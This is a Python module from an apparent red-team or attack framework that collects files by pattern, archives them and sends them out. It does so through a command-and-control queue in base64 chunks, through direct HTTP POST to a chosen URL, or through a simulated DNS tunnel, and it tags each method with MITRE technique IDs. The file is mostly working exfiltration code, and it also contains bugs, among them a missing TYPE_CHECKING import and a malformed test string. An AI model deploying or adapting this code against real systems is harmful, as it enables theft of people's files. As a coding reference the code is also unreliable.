"""
Exfiltration Module
Handles collection and exfiltration of data.
"""

import os
import sys
import time
import random
import string
import base64
import zipfile
import tempfile
import logging
import glob
import shutil
import threading
import socket # For basic DNS lookup simulation
import math
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
import requests

# Avoid circular import for type hinting
if TYPE_CHECKING:
    from ..command_control.command_control import CommandControl
    from ..execution.execution import Execution # May need later for compression tools

class Exfiltration:
    """Handles data collection and exfiltration techniques."""
    
    # Inject CommandControl to access its outbound queue/mechanism
    def __init__(self, command_control_module: Optional['CommandControl'] = None):
        self.command_control = command_control_module
        self.config = {
            "default_max_file_size_kb": 10240, # 10MB
            "default_max_total_exfil_kb": 102400, # 100MB per operation
            "default_max_files": 100,
            "default_chunk_size_kb": 512,
            "default_archive_format": "zip",
            "staging_dir_base": None # Optional base for temp staging dirs
        }
        self.logger = logging.getLogger(__name__)
        if not command_control_module:
            self.logger.warning("Exfiltration module initialized WITHOUT CommandControl module. Exfil via C2 will fail.")

    def update_config(self, config: Dict[str, Any]):
        """Update internal config with loaded configuration."""
        exfil_config = config.get("modules", {}).get("exfiltration", {})
        self.config.update(exfil_config)
        self.logger.info("Exfiltration module configuration updated.")

    def run_exfiltration(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Route exfiltration requests to appropriate handlers."""
        result = {
            "status": "success",
            "timestamp": datetime.now().isoformat(),
            "results": {}
        }
        errors = []

        exfil_requests = data.get("exfiltrate", {}) # e.g., {"method": "via_c2", "details": {...}}
        method = exfil_requests.get("method")
        details = exfil_requests.get("details", {})

        if not method:
            return {"status": "error", "message": "Missing 'method' in exfiltration request data."}

        handler_map = {
            "via_c2": self._handle_exfil_via_c2,
            "direct_http": self._handle_exfil_direct_http,
            "dns_tunnel": self._handle_exfil_dns_tunnel,
            # Deprecated/Simulated
            "data_transfer": self._handle_not_implemented,
            "protocol_exfiltration": self._handle_not_implemented,
        }

        handler = handler_map.get(method)

        if handler:
            try:
                exfil_result = handler(details)
                result["results"][method] = exfil_result
                if exfil_result.get("status") == "failure":
                    result["status"] = "partial_success"
                    errors.append(f"Method '{method}' failed: {exfil_result.get('details', {}).get('error', 'Unknown reason')}")
            except Exception as e:
                error_msg = f"Exfiltration method '{method}' failed: {e}"
                errors.append(error_msg)
                self._log_error(error_msg, exc_info=True)
                result["results"][method] = {"status": "error", "message": str(e)}
        else:
            error_msg = f"Unsupported exfiltration method requested: {method}"
            errors.append(error_msg)
            self._log_error(error_msg)
            result["results"][method] = {"status": "error", "message": error_msg}

        if errors:
            result["status"] = "failure" if not result["results"] or all(v.get("status") == "error" for v in result["results"].values()) else "partial_success"
            result["errors"] = errors

        return result
        
    def _collect_files(self, details: Dict[str, Any]) -> Tuple[List[str], int, List[str]]:
        """Collects files based on paths, patterns, and limits."""
        paths_to_search = details.get("paths", [])
        patterns = details.get("patterns", ["*"]) # Default to all files
        max_size_kb = details.get("max_file_size_kb", self.config["default_max_file_size_kb"])
        max_total_kb = details.get("max_total_exfil_kb", self.config["default_max_total_exfil_kb"])
        max_files = details.get("max_files", self.config["default_max_files"])
        recursive = details.get("recursive", True)
        
        collected_files = []
        skipped_files = []
        total_size_kb = 0
        checked_count = 0

        if not isinstance(paths_to_search, list): paths_to_search = [paths_to_search]
        if not isinstance(patterns, list): patterns = [patterns]
        
        self.logger.info(f"Starting file collection. Paths: {paths_to_search}, Patterns: {patterns}, MaxFiles: {max_files}, MaxFileSizeKB: {max_size_kb}, MaxTotalKB: {max_total_kb}")

        for start_path_str in paths_to_search:
            start_path = Path(start_path_str).expanduser() # Expand ~
            if not start_path.exists():
                self.logger.warning(f"Collection path does not exist: {start_path}")
                skipped_files.append(f"{start_path} (Not Found)")
                continue

            # Determine if path is dir or file
            if start_path.is_file():
                 iterator = [start_path]
                 is_dir_search = False
            elif start_path.is_dir():
                 # Create a generator for walking or globbing
                 if recursive:
                      iterator = start_path.rglob("*") # Generator for recursive glob
                 else:
                      iterator = start_path.glob("*") # Generator for non-recursive glob
                 is_dir_search = True
            else:
                 self.logger.warning(f"Collection path is not a file or directory: {start_path}")
                 skipped_files.append(f"{start_path} (Not File/Dir)")
                 continue

            # Iterate through files/directories found
            for item_path in iterator:
                checked_count += 1
                if len(collected_files) >= max_files:
                     self.logger.warning(f"Reached max file limit ({max_files}). Stopping collection.")
                     break # Stop outer loop too?
                     
                # If searching a directory, check if item is a file
                if is_dir_search and not item_path.is_file():
                    continue # Skip directories when iterating a directory path
                
                # Check against patterns
                matches_pattern = False
                for pattern in patterns:
                    if item_path.match(pattern):
                        matches_pattern = True
                        break
                if not matches_pattern:
                    # self.logger.debug(f"Skipping {item_path} (doesn't match patterns)")
                    continue

                # Check file size
                try:
                    file_size_bytes = item_path.stat().st_size
                    file_size_kb = file_size_bytes / 1024.0

                    if file_size_kb > max_size_kb:
                         # self.logger.debug(f"Skipping {item_path} (size {file_size_kb:.2f}KB > max {max_size_kb}KB)")
                         skipped_files.append(f"{item_path} (Too Large)")
                         continue
                    
                    if (total_size_kb + file_size_kb) > max_total_kb:
                         self.logger.warning(f"Reached max total size ({max_total_kb}KB). Cannot add {item_path}. Stopping collection.")
                         skipped_files.append(f"{item_path} (Exceeds Total Limit)")
                         break # Stop processing this path

                    # If all checks pass, add to list
                    collected_files.append(str(item_path.resolve()))
                    total_size_kb += file_size_kb
                    self.logger.debug(f"Collected: {item_path} ({file_size_kb:.2f}KB)")

                except OSError as e:
                    self.logger.warning(f"Could not access/stat file {item_path}: {e}")
                    skipped_files.append(f"{item_path} (Access Error)")
                except Exception as e:
                    self.logger.warning(f"Unexpected error processing file {item_path}: {e}")
                    skipped_files.append(f"{item_path} (Unknown Error)")

            if len(collected_files) >= max_files or total_size_kb >= max_total_kb:
                 break # Stop searching other paths if limits reached
                 
        self.logger.info(f"File collection finished. Collected {len(collected_files)} files, Total Size: {total_size_kb:.2f}KB. Skipped {len(skipped_files)} files. Checked {checked_count} items.")
        return collected_files, total_size_kb, skipped_files

    def _stage_and_archive_files(self, file_list: List[str], details: Dict[str, Any]) -> Tuple[Optional[str], str]:
        """Copies files to a staging directory and creates an archive."""
        archive_format = details.get("archive_format", self.config["default_archive_format"]) # zip, tar
        archive_password = details.get("archive_password")
        compression_level = details.get("compression_level", zipfile.ZIP_DEFLATED) # zipfile specific
        staging_base = self.config.get("staging_dir_base")
        
        staging_dir = tempfile.mkdtemp(prefix="bluefire_exfil_", dir=staging_base)
        self.logger.info(f"Created staging directory: {staging_dir}")
        
        archive_name_base = f"exfil_pkg_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        archive_path = None
        error_msg = ""

        try:
            # Copy files to staging - preserving relative paths could be complex, simple copy for now
            staged_files_map = {}
            for file_path_str in file_list:
                 try:
                      file_path = Path(file_path_str)
                      staged_path = Path(staging_dir) / file_path.name
                      # Handle potential name collisions simply
                      counter = 0
                      while staged_path.exists():
                          counter += 1
                          staged_path = Path(staging_dir) / f"{file_path.stem}_{counter}{file_path.suffix}"
                          
                      shutil.copy2(file_path, staged_path) # copy2 preserves metadata
                      staged_files_map[file_path_str] = str(staged_path)
                 except Exception as e:
                      self.logger.warning(f"Failed to stage file {file_path_str}: {e}")
                      # Store error and continue? Or fail? Let's continue for now.
                      error_msg += f"Failed to stage {file_path_str}: {e}\n"

            if not staged_files_map:
                 raise FileNotFoundError("No files were successfully staged.")

            # Create archive
            if archive_format.lower() == "zip":
                archive_path = os.path.join(staging_dir, f"{archive_name_base}.zip")
                self.logger.info(f"Creating zip archive: {archive_path}")
                with zipfile.ZipFile(archive_path, 'w', compression=compression_level) as zipf:
                    if archive_password:
                         # Note: zipfile's built-in encryption is weak. Consider external tools for strong encryption.
                         zipf.setpassword(archive_password.encode())
                         self.logger.info("Applying password protection to zip (basic).")
                    for original_path, staged_path in staged_files_map.items():
                         # Add files to archive using their original basename
                         zipf.write(staged_path, arcname=Path(original_path).name)
            
            # Add elif for tarfile here if needed (.tar.gz, .tar.bz2)
            
            else:
                raise ValueError(f"Unsupported archive format: {archive_format}")
            
            self.logger.info(f"Archive created successfully: {archive_path}")
            
        except Exception as e:
            self.logger.error(f"Error during staging/archiving: {e}", exc_info=True)
            error_msg += f" Archiving failed: {e}"
            archive_path = None # Ensure archive path is None on failure
        finally:
            # Optionally clean up individual staged files if archive created?
            # For simplicity, we rely on cleaning up the whole staging dir later.
            pass
            
        return archive_path, error_msg # Return path to archive or None, and any errors

    def _handle_exfil_via_c2(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Collects, optionally archives, chunks, encodes, and queues data for C2 exfil."""
        if not self.command_control:
             return {"status": "error", "message": "CommandControl module unavailable for C2 exfil."}
             
        chunk_size_kb = details.get("chunk_size_kb", self.config["default_chunk_size_kb"])
        chunk_size_bytes = int(chunk_size_kb * 1024)
        do_archive = details.get("archive", True)
        cleanup_staging = details.get("cleanup", True)
        
        result_details = {
             "collection_details": details, # Include collection params
             "archived": do_archive,
             "chunk_size_kb": chunk_size_kb,
             "files_collected_count": 0,
             "total_size_kb": 0,
             "chunks_sent_count": 0,
             "exfil_data_queued": False
        }
        status = "failure"
        staging_dir_to_clean = None
        archive_file_to_clean = None

        try:
            # 1. Collect files
            collected_files, total_kb, skipped = self._collect_files(details)
            result_details["files_collected"] = collected_files
            result_details["files_skipped"] = skipped
            result_details["files_collected_count"] = len(collected_files)
            result_details["total_size_kb"] = round(total_kb, 2)
            
            if not collected_files:
                raise FileNotFoundError("No files collected matching criteria.")

            # 2. Stage and Archive (if requested)
            source_path_to_read = None
            archive_errors = ""
            if do_archive:
                 archive_path, archive_errors = self._stage_and_archive_files(collected_files, details)
                 if archive_path:
                      source_path_to_read = archive_path
                      archive_file_to_clean = archive_path
                      # Staging dir cleanup handled later
                      staging_dir_to_clean = os.path.dirname(archive_path)
                      result_details["archive_file"] = archive_path
                      if archive_errors: result_details["archive_warnings"] = archive_errors
                 else:
                      # Failed to archive, attempt to exfil individual files?
                      # For now, treat archive failure as overall failure if archive=True
                      raise IOError(f"Archiving failed: {archive_errors}")
            else:
                 # Exfil individual files (handle multiple files later)
                 if len(collected_files) > 1:
                      # TODO: Handle exfil of multiple individual files (queue them all?)
                      self.logger.warning("Exfil of multiple individual files via C2 not fully implemented yet. Sending first file only.")
                 source_path_to_read = collected_files[0]
                 result_details["file_sent"] = source_path_to_read

            # 3. Read, Chunk, Encode, and Queue
            if source_path_to_read:
                file_basename = os.path.basename(source_path_to_read)
                chunk_index = 0
                bytes_sent = 0
                try:
                    with open(source_path_to_read, 'rb') as f:
                        while True:
                            chunk = f.read(chunk_size_bytes)
                            if not chunk: break # End of file
                            
                            encoded_chunk = base64.b64encode(chunk).decode('ascii')
                            chunk_index += 1
                            bytes_sent += len(chunk)
                            
                            # Construct data payload for C2 queue
                            # This needs to be understood by the C2 module's beacon worker
                            exfil_payload = {
                                "type": "exfil_chunk",
                                "filename": file_basename,
                                "chunk_index": chunk_index,
                                "data_b64": encoded_chunk,
                                # Add EOF marker? Or let C2 server reassemble based on index?
                                # Add total size/chunks? Complicates things.
                                # Keep it simple for now.
                            }
                            
                            # Add payload to C2 queue (Needs implementation in C2 module)
                            if hasattr(self.command_control, 'queue_outgoing_data'):
                                 self.command_control.queue_outgoing_data(exfil_payload)
                            else:
                                 # Fallback: Use the task results queue (less ideal)
                                 if hasattr(self.command_control, 'task_results_queue') and hasattr(self.command_control, 'results_lock'):
                                      with self.command_control.results_lock:
                                           self.command_control.task_results_queue.append(exfil_payload)
                                 else:
                                      raise NotImplementedError("C2 module does not have a suitable queue for exfil data.")

                            self.logger.debug(f"Queued chunk {chunk_index} for {file_basename} ({len(chunk)} bytes) for C2 exfil.")
                            result_details["exfil_data_queued"] = True
                            result_details["chunks_sent_count"] = chunk_index
                            
                            # TODO: Add potential delay between chunks?

                    status = "success"
                    self.logger.info(f"Successfully read and queued {chunk_index} chunks ({bytes_sent} bytes) from {file_basename} for exfil via C2.")

                except FileNotFoundError:
                     raise # Already caught if source_path is None
                except IOError as e:
                     raise IOError(f"Error reading file {source_path_to_read}: {e}")
                except NotImplementedError as e:
                    raise # Propagate queue error
                except Exception as e:
                     raise Exception(f"Error during chunking/queuing: {e}")
            else:
                # This case implies archive failed or no files collected
                # Error should have been raised earlier
                raise ValueError("No source file determined for reading.")

        except (FileNotFoundError, IOError, ValueError, NotImplementedError) as e:
            result_details["error"] = str(e)
            self.logger.error(f"Exfil via C2 failed: {e}", exc_info=False) # Keep log cleaner for known errors
            status = "failure"
        except Exception as e:
            result_details["error"] = f"Unexpected error during exfil via C2: {e}"
            self.logger.error(result_details["error"], exc_info=True)
            status = "error"
        finally:
            # 4. Cleanup Staging Area
            if cleanup_staging and staging_dir_to_clean:
                 try:
                      shutil.rmtree(staging_dir_to_clean)
                      self.logger.info(f"Cleaned up staging directory: {staging_dir_to_clean}")
                 except Exception as e:
                      self.logger.warning(f"Failed to clean up staging directory {staging_dir_to_clean}: {e}")
                      if "error" not in result_details: result_details["error"] = ""
                      result_details["error"] += f" | Cleanup Warning: Failed to delete {staging_dir_to_clean}"
            elif archive_file_to_clean and not staging_dir_to_clean: # Handle cleanup if only archive created, no staging dir var set
                 # This case might occur if staging failed but archive path was somehow returned
                 # Or if we add non-staged archiving later
                 try:
                      if os.path.exists(archive_file_to_clean):
                          os.remove(archive_file_to_clean)
                          self.logger.info(f"Cleaned up archive file: {archive_file_to_clean}")
                 except Exception as e:
                      self.logger.warning(f"Failed to clean up archive file {archive_file_to_clean}: {e}")

        return {
            "status": status,
            "technique": "exfil_via_c2",
            "mitre_technique_id": "T1041", # Exfiltration Over C2 Channel
            "mitre_technique_name": "Exfiltration Over C2 Channel",
            "timestamp": datetime.now().isoformat(),
            "details": result_details
        }

    def _handle_exfil_direct_http(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Exfiltrate data via a direct HTTP POST request."""
        status = "failure"
        result_details = {}
        staged_archive_path = None
        staging_dir = None # To ensure cleanup
        mitre_id = "T1041" # Exfiltration Over C2 Channel (approximation for direct POST)
        mitre_name = "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol"

        http_post_url = details.get("http_post_url")
        if not http_post_url:
            result_details["error"] = "Missing required parameter: http_post_url"
            self.logger.error(result_details["error"])
            return {"status": "error", "message": result_details["error"], "details": result_details}

        result_details["target_url"] = http_post_url
        
        try:
            # 1. Collect Files
            collected_files, total_size_kb, skipped_files = self._collect_files(details)
            result_details["files_collected"] = len(collected_files)
            result_details["total_size_kb"] = round(total_size_kb, 2)
            result_details["files_skipped"] = skipped_files

            if not collected_files:
                raise FileNotFoundError("No files were collected matching the criteria.")

            # 2. Stage and Archive Files
            staged_archive_path, staging_dir = self._stage_and_archive_files(collected_files, details)
            result_details["archive_path"] = staged_archive_path
            if not staged_archive_path or not os.path.exists(staged_archive_path):
                 raise FileNotFoundError("Failed to create or find the staged archive file.")
            
            # 3. Send via HTTP POST
            self.logger.info(f"Attempting to exfiltrate archive {staged_archive_path} via HTTP POST to {http_post_url}")
            headers = details.get("headers", {})
            # Use a default content type if none provided
            if 'Content-Type' not in headers:
                 headers['Content-Type'] = 'application/octet-stream'
            verify_ssl = details.get("verify_ssl", True)
            timeout = details.get("timeout_seconds", 60)

            with open(staged_archive_path, 'rb') as f_archive:
                 try:
                      response = requests.post(http_post_url, data=f_archive, 
                                                 headers=headers, verify=verify_ssl, timeout=timeout)
                      response.raise_for_status() # Check for HTTP errors
                      
                      status = "success"
                      result_details["http_status_code"] = response.status_code
                      result_details["response_snippet"] = response.text[:200] # Log beginning of response
                      self.logger.info(f"Successfully POSTed archive to {http_post_url}. Status: {response.status_code}")
                      
                 except requests.exceptions.RequestException as req_err:
                      result_details["error"] = f"HTTP POST request failed: {req_err}"
                      self.logger.error(result_details["error"])
                 except Exception as post_err:
                      result_details["error"] = f"Unexpected error during HTTP POST: {post_err}"
                      self.logger.error(result_details["error"], exc_info=True)

        except FileNotFoundError as fnf_err:
             result_details["error"] = str(fnf_err)
             self.logger.error(result_details["error"])
        except Exception as e:
            result_details["error"] = f"Error during direct HTTP exfiltration process: {e}"
            self.logger.error(result_details["error"], exc_info=True)
        finally:
            # 4. Cleanup Staging Directory
            if staging_dir and os.path.exists(staging_dir):
                try:
                    shutil.rmtree(staging_dir)
                    self.logger.info(f"Cleaned up staging directory: {staging_dir}")
                except Exception as clean_err:
                    self.logger.warning(f"Failed to clean up staging directory {staging_dir}: {clean_err}")

        return {
            "status": status,
            "technique": "exfil_direct_http",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "timestamp": datetime.now().isoformat(),
            "details": result_details
        }

    def _handle_exfil_dns_tunnel(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Collects files, encodes data, and simulates exfil via DNS queries."""
        # Parameters:
        # - controlled_domain: The domain name to send queries to (e.g., "exfil.mycorp.com")
        # - chunk_size: Max chars per DNS label (default: 60)
        # - session_id: Optional ID to distinguish different exfil sessions
        # (Inherits collection/archiving params from _collect_files/_stage_and_archive_files)

        controlled_domain = details.get("controlled_domain")
        if not controlled_domain:
            return {"status": "failure", "reason": "Missing 'controlled_domain' in details for dns_tunnel exfil."}

        chunk_size = details.get("chunk_size", 60)
        session_id = details.get("session_id", os.urandom(4).hex())

        self.logger.info(f"Starting DNS Tunnel exfiltration simulation to domain: {controlled_domain}")
        collected_files, total_kb, skipped = [], 0, []
        archive_path = None
        staging_dir = None
        status = "failure"
        reason = ""
        simulated_queries = 0
        failed_queries = 0

        try:
            # Step 1: Collect Files
            self.logger.info("Step 1: Collecting files...")
            collected_files, total_kb, skipped = self._collect_files(details)
            if not collected_files:
                 raise FileNotFoundError("No files collected for exfiltration.")
            self.logger.info(f"Collected {len(collected_files)} files ({total_kb:.2f} KB). Skipped {len(skipped)}.")

            # Step 2: Stage and Archive
            self.logger.info("Step 2: Staging and archiving files...")
            archive_path, error_msg = self._stage_and_archive_files(collected_files, details)
            if not archive_path:
                raise Exception(f"Failed to create archive: {error_msg}")
            staging_dir = os.path.dirname(archive_path)
            archive_size_kb = Path(archive_path).stat().st_size / 1024.0
            self.logger.info(f"Created archive: {archive_path} ({archive_size_kb:.2f} KB)")

            # Step 3: Read, Encode, Chunk, and Simulate DNS Queries
            self.logger.info("Step 3: Encoding data and simulating DNS queries...")
            with open(archive_path, 'rb') as f:
                archive_data = f.read()
            
            # Use Base32 for DNS label compatibility (alphanumeric), remove padding
            encoded_data = base64.b32encode(archive_data).decode('ascii').rstrip('=')
            self.logger.debug(f"Encoded data length: {len(encoded_data)} chars (Base32)")

            num_chunks = math.ceil(len(encoded_data) / chunk_size)
            self.logger.info(f"Splitting into {num_chunks} chunks of max size {chunk_size}...")

            for i in range(num_chunks):
                chunk = encoded_data[i * chunk_size : (i + 1) * chunk_size]
                # Construct the FQDN: <chunk>.<chunk_index>.<session>.<domain>
                fqdn = f"{chunk}.{i}.{session_id}.{controlled_domain}"
                
                # Check FQDN length constraints (max 253 total, max 63 per label)
                if len(fqdn) > 253:
                     self.logger.warning(f"Skipping query, generated FQDN too long ({len(fqdn)} chars): {fqdn[:100]}..." )
                     failed_queries += 1
                     continue
                labels = fqdn.split('.')
                if any(len(label) > 63 for label in labels):
                    self.logger.warning(f"Skipping query, generated label too long in FQDN: {fqdn}")
                    failed_queries += 1
                    continue

                # Simulate DNS query
                simulated_queries += 1
                try:
                    # Using gethostbyname for basic simulation - uses system resolver
                    # A real tool might use dnspython or raw sockets
                    self.logger.debug(f"Simulating DNS query for: {fqdn}")
                    # socket.gethostbyname(fqdn) # Uncomment to actually perform lookup
                    # Add a small delay to avoid overwhelming resolver/network?
                    time.sleep(0.05)
                except socket.gaierror as e:
                    # Expected if domain doesn't resolve or network issue
                    self.logger.warning(f"Simulated DNS query for {fqdn} failed (as expected?): {e}")
                    # In a real scenario, this might indicate success (server received it)
                    # or failure (network block). Hard to tell in simulation.
                    # Let's count it as a failed query attempt for simulation clarity
                    failed_queries += 1
                except Exception as e:
                     self.logger.error(f"Unexpected error during simulated DNS query for {fqdn}: {e}")
                     failed_queries += 1
            
            if simulated_queries > 0 and failed_queries < simulated_queries:
                status = "success" # Assume success if most queries simulated without error
                reason = f"Simulated {simulated_queries} DNS queries for {len(encoded_data)} chars of data. {failed_queries} queries failed lookup (may be expected)."
                self.logger.info("DNS Tunnel simulation finished.")
            else:
                 reason = f"DNS Tunnel simulation failed. Attempted {simulated_queries} queries, {failed_queries} failed." 
                 self.logger.error(reason)

        except FileNotFoundError as e:
             reason = f"File collection/staging failed: {e}"
             self.logger.error(reason)
        except Exception as e:
             reason = f"Exfiltration process failed: {e}"
             self.logger.error(reason, exc_info=True)
        finally:
             # Step 4: Cleanup Staging Directory
             if staging_dir and os.path.exists(staging_dir):
                 self.logger.info(f"Step 4: Cleaning up staging directory: {staging_dir}")
                 try:
                      shutil.rmtree(staging_dir)
                      self.logger.debug("Staging directory removed.")
                 except Exception as e_clean:
                      self.logger.error(f"Failed to clean up staging directory {staging_dir}: {e_clean}")

        return {
            "status": status,
            "technique": "dns_tunnel",
            "controlled_domain": controlled_domain,
            "session_id": session_id,
            "files_collected_count": len(collected_files),
            "archive_size_kb": round(archive_size_kb, 2) if archive_path else 0,
            "encoded_data_chars": len(encoded_data) if 'encoded_data' in locals() else 0,
            "simulated_queries": simulated_queries,
            "failed_queries": failed_queries,
            "reason": reason if status != "success" else f"Successfully simulated {simulated_queries} DNS queries."
        }

    def _handle_not_implemented(self, details: Dict[str, Any], method_name: str = "Unknown") -> Dict[str, Any]:
        """Placeholder for exfiltration techniques not yet implemented."""
        self.logger.warning(f"Exfiltration method '{method_name}' is not implemented.")
        return {"status": "not_implemented", "details": {"error": f"Method '{method_name}' not implemented."}}

    def _log_error(self, message: str, exc_info=False) -> None:
        """Log errors using the initialized logger."""
        self.logger.error(message, exc_info=exc_info)

# Example Usage (for testing)
if __name__ == '__main__':
    import json
    
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

    # Mock CommandControl with a queue for testing
    class MockCommandControl:
        def __init__(self):
            self.outgoing_queue = []
            self.results_lock = threading.Lock() # Mimic lock if using results queue
            self.task_results_queue = self.outgoing_queue # Use same queue for fallback
            self.logger = logging.getLogger("MockC2")
            
        def queue_outgoing_data(self, data: Dict[str, Any]):
            self.logger.info(f"[MockC2] Queued outgoing data: { {k: v[:50] + '...' if isinstance(v, str) and len(v) > 50 else v for k, v in data.items()} }")
            self.outgoing_queue.append(data)
            
        def get_queued_data(self):
            return self.outgoing_queue[:]
            
    mock_c2 = MockCommandControl()
    exfil_module = Exfiltration(command_control_module=mock_c2)
    # exfil_module.update_config({}) # Load actual config here if needed

    # --- Setup Test Files --- 
    test_dir = tempfile.mkdtemp(prefix="bluefire_exfil_testdir_")
    file_paths_created = []
    try:
        # Create some dummy files
        content1 = "This is sensitive file one." * 500 # Make it ~10KB
        path1 = os.path.join(test_dir, "secret_doc.txt")
        with open(path1, "w") as f: f.write(content1)
        file_paths_created.append(path1)
        
        content2 = "{"key": "value", "data": [1, 2, 3]}" * 100 # Small JSON
        path2 = os.path.join(test_dir, "config.json")
        with open(path2, "w") as f: f.write(content2)
        file_paths_created.append(path2)
        
        # Create a larger file to test size limits
        content3 = "Large file content." * 100000 # ~1.8MB
        path3 = os.path.join(test_dir, "large_log.log")
        with open(path3, "w") as f: f.write(content3)
        file_paths_created.append(path3)
        
        print(f"Created test directory and files: {test_dir}")
        
        # --- Test Case 1: Collect txt and json, archive, exfil via C2 --- 
        print("\n--- Test Case 1: Archive *.txt, *.json via C2 ---")
        exfil_request_1 = {"exfiltrate": {
            "method": "via_c2", 
            "details": {
                "paths": [test_dir],
                "patterns": ["*.txt", "*.json"],
                "recursive": True,
                "archive": True,
                "chunk_size_kb": 5 # Small chunks for testing
            }
        }}
        result1 = exfil_module.run_exfiltration(exfil_request_1)
        print(json.dumps(result1, indent=2))
        print(f"Mock C2 Queue length: {len(mock_c2.get_queued_data())}")
        # print(f"First chunk data (first 50 chars): {mock_c2.get_queued_data()[0].get('data_b64', '')[:50]}")
        mock_c2.outgoing_queue.clear() # Clear queue for next test
        
        # --- Test Case 2: Collect log file (too large), should be skipped --- 
        print("\n--- Test Case 2: Collect large log (should skip) via C2 ---")
        exfil_request_2 = {"exfiltrate": {
            "method": "via_c2", 
            "details": {
                "paths": [test_dir],
                "patterns": ["*.log"],
                "max_file_size_kb": 1000, # Set max size to 1MB
                "archive": False, # Try sending individually
                "chunk_size_kb": 512
            }
        }}
        result2 = exfil_module.run_exfiltration(exfil_request_2)
        print(json.dumps(result2, indent=2))
        print(f"Mock C2 Queue length: {len(mock_c2.get_queued_data())}") # Should be 0
        mock_c2.outgoing_queue.clear()

        # --- Test Case 3: Collect all, no archive --- 
        print("\n--- Test Case 3: Collect all (no archive) via C2 - sends first file only ---")
        exfil_request_3 = {"exfiltrate": {
            "method": "via_c2", 
            "details": {
                "paths": [test_dir],
                "patterns": ["*"],
                "max_file_size_kb": 2000, # Allow large file this time
                "archive": False,
                "chunk_size_kb": 1024
            }
        }}
        result3 = exfil_module.run_exfiltration(exfil_request_3)
        print(json.dumps(result3, indent=2))
        print(f"Mock C2 Queue length: {len(mock_c2.get_queued_data())}") # Should be > 0
        mock_c2.outgoing_queue.clear()

    finally:
        # --- Cleanup --- 
        print(f"\n--- Cleaning up test directory: {test_dir} ---")
        if os.path.exists(test_dir):
             try:
                  shutil.rmtree(test_dir)
                  print("Test directory removed.")
             except Exception as e:
                  print(f"Error removing test directory {test_dir}: {e}") 